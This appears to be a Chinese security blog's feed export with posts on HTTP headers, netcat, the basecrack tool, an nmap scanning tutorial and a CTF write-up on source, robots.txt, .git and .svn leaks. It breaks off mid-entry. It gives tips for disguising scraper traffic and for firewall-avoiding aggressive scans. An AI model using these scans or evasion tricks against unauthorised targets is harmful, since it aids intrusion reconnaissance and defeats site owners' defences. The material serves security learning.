        <content type="html"><![CDATA[<h1 id="最常见的HTTP-Headers"><a href="#最常见的HTTP-Headers" class="headerlink" title="最常见的HTTP Headers"></a>最常见的HTTP Headers</h1><ol><li>使用和优化HTTP Headers。这种方法会大大减少您的网络爬虫被各种数据源封锁的可能性，并确保检索到高质量的数据。</li><li>Header使客户端和服务器都能够在请求或响应中传输更多详细信息。<br><img src="https://s2.loli.net/2022/05/23/lvfEKmxSVF3QaNd.png"></li></ol><h2 id="HTTP-Header-User-Agent"><a href="#HTTP-Header-User-Agent" class="headerlink" title="HTTP Header User-Agent"></a>HTTP Header User-Agent</h2><ol><li>User-Agent Header传递的信息包括应用类型，操作系统，软件和版本信息，并允许数据目标来决定使用何种类型的HTML布局来响应，手机、平板电脑或PC均可显示不同的HTML布局。</li><li>网络服务器经常会验证User-Agent Header，这是网站服务器的第一重保障，这个步骤可以让数据源识别出可疑请求。例如，网络抓取时，大量请求传输到网络服务器，如果User-Agent Header相同，那么服务器端就会判定是爬虫行为。因此，有经验的网页抓取者会把User-Agent Header修改成不同的字符串，从而让服务器识别成是多个自然用户在发出请求。</li><li>因此，当涉及到User-Agent Header时，需要经常更改此Header的信息，这样就不容易因为这个Header而被封锁。</li></ol><h2 id="HTTP-Header-Accept-Language"><a href="#HTTP-Header-Accept-Language" class="headerlink" title="HTTP Header Accept-Language"></a>HTTP Header Accept-Language</h2><ol><li>Accept-Language Header向网络服务器传递的信息包含客户端有哪些语言，以及当网络服务器发回响应时首选哪种特定语言。</li><li>当网络服务器无法识别首选语言时，通常会使用特定Header。</li><li>也就是说，Accept-Language Header的关键是相关性。必须确保设置的语言符合数据目标域和客户端的IP位置。原因很简单，如果来自同一个客户端的请求内置有多种语言，网络服务器就会怀疑是爬虫行为，因此，网站就可能会阻止网络抓取过程。</li></ol><h2 id="HTTP-Header-Accept-Encoding"><a href="#HTTP-Header-Accept-Encoding" class="headerlink" title="HTTP Header Accept-Encoding"></a>HTTP Header Accept-Encoding</h2><ol><li>Accept-Encoding Header通知网络服务器在处理请求时使用哪种压缩算法。换句话说，当从网络服务器发送到客户端时，如果服务器可以处理，就会确认可以压缩的信息。</li><li>使用该Header优化后它可以节省流量，从流量负载的角度来看，这对客户端和网络服务器来说都比较好。客户端仍然会获得所需的信息，只是被压缩了。数据压缩后，网络服务器的流量小了，资源就节约下来了。</li></ol><h2 id="HTTP-Header-Accept"><a href="#HTTP-Header-Accept" class="headerlink" title="HTTP Header Accept"></a>HTTP Header Accept</h2><ol><li>Accept Header属于内容协商类别，其目的是通知网络服务器可以向客户端返回什么类型的数据格式。</li><li>听起来很简单，但是网络抓取最常犯的一个错误就是忽略或忘记根据网络服务器接受的格式来配置Header。如果Accept Header配置得当，就会让客户端和服务器之间的通信更加像真实用户行为，从而减少网络爬虫被封锁的可能性。</li></ol><h2 id="HTTP-Header-Referer"><a href="#HTTP-Header-Referer" class="headerlink" title="HTTP Header Referer"></a>HTTP Header Referer</h2><ol><li>在将请求发送到网络服务器之前，Referer Header会提供请求前用户所在的网页地址。</li><li>在网站试图阻止抓取过程时，Referer Header其实影响不大。一个随机的真实用户很可能上网时间间隔数小时。因此，如果您想网络抓取工具的流量看上去更加自然，只需在开始网络抓取会话之前指定一个随机网站。</li></ol><h1 id="HTTP-headers-数据类型"><a href="#HTTP-headers-数据类型" class="headerlink" title="HTTP headers 数据类型"></a>HTTP headers 数据类型</h1><ol><li>Accept：浏览器可接受的MIME类型。</li><li>Accept-Charset：浏览器可接受的字符集。</li><li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。</li><li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。</li><li>Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中。</li><li>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。</li><li>Content-Length：表示请求消息正文的长度。</li><li>Cookie：这是最重要的请求头信息之一</li><li>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。</li><li>Host：初始URL中的主机和端口。</li><li>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。</li><li>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。</li><li>Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。</li><li>User-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。</li><li>UA-Pixels，UA-Color，UA-OS，UA-CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。</li><li>HTTP应答头概述（HttpServletResponse）</li><li>Web服务器的HTTP应答一般由以下几项构成：一个状态行，一个或多个应答头，一个空行，内容文档。设置HTTP应答头往往和设置状态行中的状态代码结合起来。例如，有好几个表示“文档位置已经改变”的状态代码都伴随着一个Location头，而401（Unauthorized）状态代码则必须伴随一个WWW-Authenticate头。<br>然而，即使在没有设置特殊含义的状态代码时，指定应答头也是很有用的。应答头可以用来完成：设置Cookie，指定修改日期，指示浏览器按照指定的间隔刷新页面，声明文档的长度以便利用持久HTTP连接，……等等许多其他任务。<br>设置应答头最常用的方法是HttpServletResponse的setHeader，该方法有两个参数，分别表示应答头的名字和值。和设置状态代码相似，设置应答头应该在发送任何文档内容之前进行。</li><li>HttpServletResponse还提供了许多设置</li><li>setContentType：设置Content-Type头。大多数Servlet都要用到这个方法。</li><li>setContentLength：设置Content-Length头。对于支持持久HTTP连接的浏览器来说，这个函数是很有用的。</li><li>addCookie：设置一个Cookie（Servlet API中没有setCookie方法，因为应答往往包含多个Set-Cookie头）。<br>另外，如上节介绍，sendRedirect方法设置状态代码302时也会设置Location头。</li><li>HTTP应答头 说明</li><li>Allow 服务器支持哪些请求方法（如GET、POST等）。</li><li>Content-Encoding 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</li><li>Content-Length 表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</li><li>Content-Type 表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</li><li>Date 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</li><li>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？</li><li>Last-Modified 文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</li><li>Location 表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</li><li>Refresh 表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL=<a href="http://host/path&quot;)%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%BB%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82%E6%B3%A8%E6%84%8F%E8%BF%99%E7%A7%8D%E5%8A%9F%E8%83%BD%E9%80%9A%E5%B8%B8%E6%98%AF%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEHTML%E9%A1%B5%E9%9D%A2HEAD%E5%8C%BA%E7%9A%84">http://host/path&quot;)让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的</a><META HTTP-EQUIV="Refresh" CONTENT="5;URL=http://host/path">实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是&lt;META HTTP-EQUIV=”Refresh” …&gt;。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</li><li>Server 服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</li><li>Set-Cookie 设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</li><li>WWW-Authenticate 客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm=&quot;executives&quot;“)。注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nc命令</title>
      <link href="/nc%E5%91%BD%E4%BB%A4/"/>
      <url>/nc%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h1><h2 id="netcat的简写"><a href="#netcat的简写" class="headerlink" title="netcat的简写"></a>netcat的简写</h2><ol><li>nc是软连接到ncat<h2 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h2></li><li>实现任意TCP/UDP端口侦听，nc可以作为server以TCP或UDP方式侦听指定端口</li><li>端口的扫描（其它的博客推荐nmap，确实是）</li><li>机器之间传输文件</li><li>机器之间网络测速</li></ol><h1 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h1><ol><li>验证服务器端口是否通<br><img src="https://img-blog.csdnimg.cn/20210615163556344.png"></li><li>拷贝文件,首先在文件接受终端test2机器上激活nc监听，然后再文件发送终端test1机器上发送文件，test2上检查文件是否已经接受<br><img src=""></li></ol><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ol><li>ncat [options] [hostname] [port]<br><img src="https://s2.loli.net/2022/05/21/ahBkJyTRbjZfHFm.png"><br><img src="https://s2.loli.net/2022/05/21/ZeqnEW7c6bFDTjI.png"><br><img src="https://s2.loli.net/2022/05/21/g6Qu3w74rNoRevt.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>basecrack工具使用</title>
      <link href="/basecrack/"/>
      <url>/basecrack/</url>
      
        <content type="html"><![CDATA[<h1 id="basecrack工具"><a href="#basecrack工具" class="headerlink" title="basecrack工具"></a>basecrack工具</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><pre class="line-numbers language-none"><code class="language-none">$ git clone https:&#x2F;&#x2F;github.com&#x2F;mufeedvh&#x2F;basecrack.git$ cd basecrack$ pip install -r requirements.txt$ python basecrack.py -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre class="line-numbers language-none"><code class="language-none">对来自用户输入的单个Base编码数据进行解码：python basecrack.py对通过参数（-b&#x2F;--base）传递的单个Base编码数据进行解码：python basecrack.py -b SGVsbG8gV29ybGQh对通过文件（-f&#x2F;--file）传递的多个Base编码数据进行解码：python basecrack.py -f file.txt对任意模式的多重Base编码数据进行解码（-m&#x2F;--magic）：python basecrack.py --magic使用解码的Base数据生成字典文件并输出（-o&#x2F;--output）：python basecrack.py -f file.txt -o output-wordlist.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap</title>
      <link href="/nmap%E4%BD%BF%E7%94%A8/"/>
      <url>/nmap%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="nmap的使用"><a href="#nmap的使用" class="headerlink" title="nmap的使用"></a>nmap的使用</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/343709343">https://zhuanlan.zhihu.com/p/343709343</a></li></ol><h2 id="图形化界面"><a href="#图形化界面" class="headerlink" title="图形化界面"></a>图形化界面</h2><ol><li>zenmap</li></ol><h2 id="分布式框架"><a href="#分布式框架" class="headerlink" title="分布式框架"></a>分布式框架</h2><ol><li>Dnamp</li></ol><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol><li>主机探测</li><li>端口扫描</li><li>版本检测</li><li>系统检测</li><li>支持探测脚本的编写</li></ol><h2 id="Nmap在实际中应用场合如下："><a href="#Nmap在实际中应用场合如下：" class="headerlink" title="Nmap在实际中应用场合如下："></a>Nmap在实际中应用场合如下：</h2><ol><li>通过对设备或者防火墙的探测来审计它的安全性</li><li>探测目标主机所开放的端口</li><li>通过识别新的服务器审计网络的安全性</li><li>探测网络上的主机</li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>端口扫描工具，即借助工具，试图了解所扫描IP提供的计算机网络服务类型（网络服务均与端口号相关），从而发现攻击弱点，常见服务对应端口号</li><li>首先判断nmap输入的命令行中是否包含域名，如果包含则需要用DNS服务器进行域名解析，然后发送ICMP Echo Request来探测主机的存活性</li><li>根据返回的数据包来得到机器信息</li></ol><h2 id="Nmap进行完整全面的扫描"><a href="#Nmap进行完整全面的扫描" class="headerlink" title="Nmap进行完整全面的扫描"></a>Nmap进行完整全面的扫描</h2><pre class="line-numbers language-none"><code class="language-none">nmap –T4 –A –v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ol><li>其中-A选项用于使用进攻性（Aggressive）方式扫描；</li><li>-T4指定扫描过程使用的时序（Timing），总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；</li><li>-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态。</li></ol><h4 id="最重要的是-T"><a href="#最重要的是-T" class="headerlink" title="最重要的是-T"></a>最重要的是-T</h4><ol><li>扫描速度过快，容易被系统拦截，导致访问一堆200，结果打开全是503，所以应避免扫描过快<br><img src="https://s2.loli.net/2022/05/18/jpYi1NqhPz392Qx.png"></li></ol><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><p><img src="https://s2.loli.net/2022/05/18/bgHAlBP93FzDmIW.png"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="扫描方式选项"><a href="#扫描方式选项" class="headerlink" title="扫描方式选项"></a>扫描方式选项</h3><p><img src="https://s2.loli.net/2022/05/18/Jek6ZarFWlzmBVU.png"></p><h3 id="端口参数和扫描顺序"><a href="#端口参数和扫描顺序" class="headerlink" title="端口参数和扫描顺序"></a>端口参数和扫描顺序</h3><p><img src="https://s2.loli.net/2022/05/18/4V8jf6sMhDFPK5T.png"></p><h3 id="版本侦测的用法"><a href="#版本侦测的用法" class="headerlink" title="版本侦测的用法"></a>版本侦测的用法</h3><p><img src="https://s2.loli.net/2022/05/18/eMa8ZJ2mXHYfCtE.png"></p><h2 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h2><ol><li>  Open 端口处于开放状态：进行TCP链接时，目标主机返回SYN+ACK的报文，就认为端口开放且使用了TCP服务</li><li>  Closed 端口处于关闭状态：返回RST类型的报文（关闭的端口也是可以访问的，只是没有上层的服务在监听此端口，而且只是我们在扫描的这个时刻为关闭，当我们在另一个时间段进行扫描时，这些关闭的端口可能会处于open状态）</li><li>  Filterd 端口处于过滤，无法收到返回的probe状态：报文无法到达指定端口，nmap不能决定端口的开放状态，主要是由于网络或者主机安装了一些防火墙导致，收到icmp报文主机不可达报文，或者目标主机无应答</li><li>  UnFilterd 端口收到返回的Probe，但是无法确认</li><li>  Opend/UnFilterd 表示端口处于开放或者被过滤状态</li><li>  Closed/UnFilterd 表示端口处于关闭或者未过滤状态</li></ol><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h3 id="用nmap扫描特定IP地址"><a href="#用nmap扫描特定IP地址" class="headerlink" title="用nmap扫描特定IP地址"></a>用nmap扫描特定IP地址</h3><p><img src="https://pic1.zhimg.com/80/v2-f9463447819bc6eddc02d61f57f26d30_720w.jpg"></p><h3 id="用-vv对结果进行详细输出"><a href="#用-vv对结果进行详细输出" class="headerlink" title="用-vv对结果进行详细输出"></a>用-vv对结果进行详细输出</h3><p><img src="https://pic2.zhimg.com/80/v2-b7f94720fc07861cda0f03a0eaaac8bd_720w.jpg"></p><h3 id="自行设置端口范围进行扫描"><a href="#自行设置端口范围进行扫描" class="headerlink" title="自行设置端口范围进行扫描"></a>自行设置端口范围进行扫描</h3><p><img src="https://pic1.zhimg.com/80/v2-70a54588925eb0a44e9d5ead03f55fbc_720w.jpg"></p><h3 id="指定端口号进行扫描"><a href="#指定端口号进行扫描" class="headerlink" title="指定端口号进行扫描"></a>指定端口号进行扫描</h3><p><img src="https://pic2.zhimg.com/80/v2-416f2b4c051b5f2bd62cbe48d3101f41_720w.jpg"></p><h3 id="对端口进行ping扫描"><a href="#对端口进行ping扫描" class="headerlink" title="对端口进行ping扫描"></a>对端口进行ping扫描</h3><p><img src="https://pic3.zhimg.com/80/v2-ef3ef08d4f7b120d170f9b0a95130b7a_720w.jpg"></p><h3 id="路由跟踪"><a href="#路由跟踪" class="headerlink" title="路由跟踪"></a>路由跟踪</h3><p><img src="https://pic1.zhimg.com/80/v2-24910deb4da23cdf158ee3dd15b98170_720w.jpg"></p><h3 id="扫描一个段的主机在线情况"><a href="#扫描一个段的主机在线情况" class="headerlink" title="扫描一个段的主机在线情况"></a>扫描一个段的主机在线情况</h3><p><img src="https://pic2.zhimg.com/80/v2-3849b8e75d023539fd93923ea7aa2bd9_720w.jpg"></p><h3 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h3><p><img src="https://pic4.zhimg.com/80/v2-4e9d4f7f27b827fbc4d976fd96511d93_720w.png"></p><h3 id="万能开关扫描"><a href="#万能开关扫描" class="headerlink" title="万能开关扫描"></a>万能开关扫描</h3><p><img src="https://pic3.zhimg.com/80/v2-fc195a646aa1353f8b71342ec6a67b26_720w.jpg"></p><h3 id="SYN-FIN-ACK等其它扫描方式"><a href="#SYN-FIN-ACK等其它扫描方式" class="headerlink" title="SYN,FIN,ACK等其它扫描方式"></a>SYN,FIN,ACK等其它扫描方式</h3><p><img src="https://s2.loli.net/2022/05/18/NpMt7T9Qv2dhK6P.png"></p><h3 id="使用具体dns服务器进行扫描"><a href="#使用具体dns服务器进行扫描" class="headerlink" title="使用具体dns服务器进行扫描"></a>使用具体dns服务器进行扫描</h3><pre class="line-numbers language-none"><code class="language-none">nmap --dns-servers 8.8.8.8 scanme.nmap.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707112619.png"></p><h3 id="扫描远程机器开放的端口"><a href="#扫描远程机器开放的端口" class="headerlink" title="扫描远程机器开放的端口"></a>扫描远程机器开放的端口</h3><ol><li><p>  对于已经知道主机存活或者防火墙开启的机器，可以使用 -Pn 参数来停止探测之前的ICMP请求，来达到不处罚防火墙的安全机制</p></li><li><p>```<br>  nmap -Pn scanme.nmap.org</p>  <pre class="line-numbers language-none"><code class="language-none">### 列举远程机器开放的端口1.   对于所有默认的端口范围，并不能满足日常工作的需要，可以使用-p m-n来指定探测端口范围为m-n之间的所有端口2.   &#96;&#96;&#96;     nmap -p 1-10000 scanme.nmap.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707113321.png"></p></li></ol><h2 id="Nmap识别目标机器上的服务指纹"><a href="#Nmap识别目标机器上的服务指纹" class="headerlink" title="Nmap识别目标机器上的服务指纹"></a>Nmap识别目标机器上的服务指纹</h2><h3 id="什么是服务指纹"><a href="#什么是服务指纹" class="headerlink" title="什么是服务指纹"></a>什么是服务指纹</h3><ol><li>  为了确保有一个成功的渗透测试和网络设备监控，必须需要知道目标系统中服务的指纹信息。服务指纹信息包括服务端口、服务名和版本等</li><li>  通过分析目标往Nmap发送的数据包中某些协议标记、选项和数据，我们可以推断发送这些数据包的操作系统等</li></ol><h3 id="识别服务指纹"><a href="#识别服务指纹" class="headerlink" title="识别服务指纹"></a>识别服务指纹</h3><ol><li>  使用命令 nmap -sV IP 地址来识别目标机器的服务信息</li><li>  <strong>按回车可以看发送进度</strong></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707115424.png"></li></ol><h3 id="Nmap的侵略性探测"><a href="#Nmap的侵略性探测" class="headerlink" title="Nmap的侵略性探测"></a>Nmap的侵略性探测</h3><ol><li><p>```<br>  nmap -A -v -T4 IP地址</p>  <pre class="line-numbers language-none"><code class="language-none">2.   探测目标主机的操作系统、服务等信息3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20230707115955.png)4.   &#96;&#96;&#96;     nmap -sC -sV -O IP地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  探测目标主机的操作系统、服务等信息，其中-sC参数表示使用Nmap脚本进行探测，sV表示探测目标主机上的服务信息，O表示探测目标机器的操作系统信息</p></li><li><p>```<br>  nmap -sC -sV -O </p>  <pre class="line-numbers language-none"><code class="language-none">7.   &#96;&#96;&#96;     nmap --script&#x3D;default 和上面相等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707132959.png"></p></li></ol><h2 id="探测局域网中存活主机"><a href="#探测局域网中存活主机" class="headerlink" title="探测局域网中存活主机"></a>探测局域网中存活主机</h2><h3 id="一个局域网中有很多台设备，如何获取哪些设备正在开机状态"><a href="#一个局域网中有很多台设备，如何获取哪些设备正在开机状态" class="headerlink" title="一个局域网中有很多台设备，如何获取哪些设备正在开机状态"></a>一个局域网中有很多台设备，如何获取哪些设备正在开机状态</h3><h4 id="使用ping来进行探测，但是网络很大的情况下，手工探测很费力"><a href="#使用ping来进行探测，但是网络很大的情况下，手工探测很费力" class="headerlink" title="使用ping来进行探测，但是网络很大的情况下，手工探测很费力"></a>使用ping来进行探测，但是网络很大的情况下，手工探测很费力</h4><ol><li><p>```<br>  ping IP地址</p>  <pre class="line-numbers language-none"><code class="language-none">#### 使用不同工具来进行批量探测1.   CIDR五类别域间路由、网络前缀来快速表示一个网络2.   172.16.1.1&#x2F;24 表示前24位不能动，只有最后8位可动，可以表示172.168.1.1-172.168.1.255之间的所有主机IP地址#### 使用nmap对该网络中的所有主机进行ping扫描，以探测主机存活性。扫描过程中使用了TCP SYN扫描、ICMP echo Request来探测主机存活1.   &#96;&#96;&#96;     nmap -sP CIDR地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>```<br>  nmap -sn CIDR地址</p>  <pre class="line-numbers language-none"><code class="language-none">3.   上面两种用法结果类似## nmap主机发现的结果输出1.   &#96;&#96;&#96;bash     nmap -sn CIDR地址 -oX test.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  对该网络中的所有主机进行ping扫描，以探测主机存活性</p></li><li><p>  同时将结果输出到test.xml文件中，以便后续使用</p></li></ol><h2 id="实际场景下的Nmap端口探测技巧"><a href="#实际场景下的Nmap端口探测技巧" class="headerlink" title="实际场景下的Nmap端口探测技巧"></a>实际场景下的Nmap端口探测技巧</h2><ol><li>  渗透测试时，一般是对某个或某个范围内的服务进行探测，而不是全扫，否则费力不讨好，全端口探测会对服务器造成较大压力</li></ol><h3 id="对某个端口或某个范围内的端口探测"><a href="#对某个端口或某个范围内的端口探测" class="headerlink" title="对某个端口或某个范围内的端口探测"></a>对某个端口或某个范围内的端口探测</h3><ol><li><p>```bash<br>  nmap -p80 scanme.nmap.org<br>  nmap -p80,135 scanme.nmap.org<br>  nmap -p1-100 scanme.nmap.org<br>  nmap -p- scanme.nmap.org</p>  <pre class="line-numbers language-none"><code class="language-none">2.   使用逗号去分隔不同的端口3.   使用短横线 - 去链接端口范围4.   -p- 端口参数后面不加具体数字，表示对所有端口进行探测### 指定协议探测端口1.   &#96;&#96;&#96;     nmap -p T:25,U:53 scanme.nmap.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  T:25 指定TCP25号端口</p></li><li><p>  U:53 指定UDP53号端口</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> awd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实战攻防信息搜集</title>
      <link href="/%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="实战攻防信息搜集"><a href="#实战攻防信息搜集" class="headerlink" title="实战攻防信息搜集"></a>实战攻防信息搜集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><ol><li>开发注释未能及时删除</li><li>打开ctrl + u查看源代码即可获得flag</li></ol><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><ol><li>有的浏览器直接打开查看源代码就能看到flag</li><li>这个题的标准思路是：使用view-source协议，edge不支持，firefox和chrome支持。</li><li>当网站不让你看源码（js过滤了源码），可以在地址栏的url前加上’view-source:’前缀查看<br><img src="https://s2.loli.net/2022/05/18/k4UizITfxOc7S1u.png"></li></ol><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><ol><li><p>用御剑和dirsearch扫了一遍，被拦了</p></li><li><p>没思路的时候burp抓个包看看，有意外收获，flag在响应的数据包里面<br><img src="https://s2.loli.net/2022/05/18/ez4SxcJiY1U7VXj.png"></p></li></ol><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><ol><li>题目提示：总有人把后台地址写入robots,知道是robots.txt协议，写后缀robots.txt，发现过滤了所有用户的/flagishere.txt<br><a href="http://www.strongwill.top/robot%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6/">robots协议</a><br><img src="https://s2.loli.net/2022/05/18/JWf5Dtjl24aimyw.png"></li><li>直觉告诉我们，被过滤的是flag，打开后真的发现了flag<br><img src="https://s2.loli.net/2022/05/18/YXu6hvxZTpa9knM.png"></li></ol><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><ol><li>phps源码泄露问题</li><li>直接访问index.phps,获得flag<br><img src="https://s2.loli.net/2022/05/18/4CSF3kr52x9yin6.png"></li><li>访问后自动下载一个index.phps文件，打开后发现flag<br><img src="https://s2.loli.net/2022/05/18/w3CcsoZLUgGtzvm.png"></li></ol><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><ol><li>考察git代码泄露，直接访问url/.git/index.php</li><li>git源码泄露一般在根目录下/.git/文件夹下找<br><img src="https://s2.loli.net/2022/05/18/TIRAXNm3fVMi1l7.png"></li></ol><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><ol><li>考察信息svn泄露，直接访问url/.svn/<br><img src="https://s2.loli.net/2022/05/18/YWCx8S9noqcURHu.png"></li></ol><h2 id="web9"><a href="#web9" class="headerlink" 